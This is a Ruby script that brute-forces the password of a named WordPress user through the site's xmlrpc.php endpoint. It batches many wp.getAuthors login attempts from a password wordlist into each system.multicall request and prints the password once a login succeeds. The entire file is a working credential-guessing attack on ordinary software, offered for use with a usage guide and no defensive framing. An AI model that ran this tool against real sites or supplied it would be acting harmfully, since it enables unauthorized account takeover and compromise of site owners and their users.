require 'nokogiri'
require 'net/http'
require 'rest-client'

################################################################################################
# GLOBAL VARIABLES
################################################################################################
$xml_header = '''
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
   <methodName>system.multicall</methodName>
   <params><param><value><array><data><value>
'''
$xml_login = '''
<struct>
  <member><name>methodName</name>
    <value><string>wp.getAuthors</string></value>
  </member>
  <member>
    <name>params</name>
    <value><array><data>
      <value><string>1</string></value>
      <value><string>USERNAME</string></value>
      <value><string>PASSWORD</string></value>
   </data></array></value>
  </member>
</struct>
'''
$xml_tail = '''
</value></data></array></value></param></params>
</methodCall>
'''

$xml_test = '''
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>demo.sayHello</methodName>
  <params></params>
</methodCall>
'''

$usage = """
ruby #{__FILE__} --url=[...] --user=[...] --count=[...] --list=[...]
   --url     The wordpress RPC endpoint.
   --user    The username you would like to bruteforce.
   --count   The number of attempts per RPC request.
   --list    The path to your password dictionary.

== More Info ==
* Ensure that the website is active, has the correct protocol (http or https), and ends in 'xmlrpc.php'.
* The wordlist should just be a list of word seperated by the new-line character.
* If you get a 'Parse error' then your count is too high.

"""
# END OF GLOBAL VARIABLES
################################################################################################


# POST the XML request to target and extract the response.
def rpc_post( url, xml_body )
  response = RestClient.post(url, xml_body, :content_type => "text/xml")
  return response.body
end

# Glorified rpc_post call to see if xmlrpc call works on target.
def test_rpc( url )
  response = rpc_post( url, $xml_test)
  return response.downcase.include?('<string>hello!</string>')
end

# Extract the arguments and check to see if the parameters are valid.
# If the parameters are bad, print out the usage.
args = Hash[ ARGV.join(' ').scan(/--?([^=\s]+)(?:=(\S+))?/) ]
begin 
  raise 'Bad Arguments' if args.length < 4 or 
                           args['url']   == nil or args['user'] == nil or
                           args['count'] == nil or args['list'] == nil
  raise 'Bad File Path or Name' if !File.exist?( args['list'] )
  raise 'Bad RPC Endpoint' if !test_rpc( args['url'] )
rescue Exception => e
  puts "\nERROR: #{e}", $usage
end

# Set the username in template to avoid constant string replacement. 
# Also convert user count and declare other varaiables.
$xml_login = $xml_login.gsub('USERNAME', args['user'])
args['count'] = args['count'].to_i
faultCodes = []
count, query, passwords = 0, '', []

# For each password in the dictionary list.
File.open( args['list'] ).each do |password|

  # Check to see if we have reached the user input count.
  if (count+=1) > args['count']
    
    # Create the query and send it to target.
    xml_res = rpc_post( args['url'], ($xml_header + query + $xml_tail) )
    
    # Iterate over the response. Each iteration is a login attempt response. 
    data = Nokogiri::XML( xml_res )
    data.xpath('//struct').each_with_index{ |res, i|

      # Check to see if there was a response that did not have an error.
      if !res.to_s.include?('faultCode')
        puts"\nPassword found!\n> #{passwords[i]}\n\n"
        exit

      # Check to see if there was a non authentication error. If so, print it.
      elsif res.to_s.include?('faultCode') and 
          !res.to_s.include?('username or password')
          puts res.xpath('//struct//member//value//string').inner_text.capitalize
      end

    }

    # All attempts failed in previous query, reset the counters.
    count, query, passwords = 0, '', []

  # Still within count so add more credentials and cache the used password. 
  else
    query += "#{ $xml_login.gsub('PASSWORD', password) }\n"
    passwords.push(password)
  end

end # End of wordlist loop

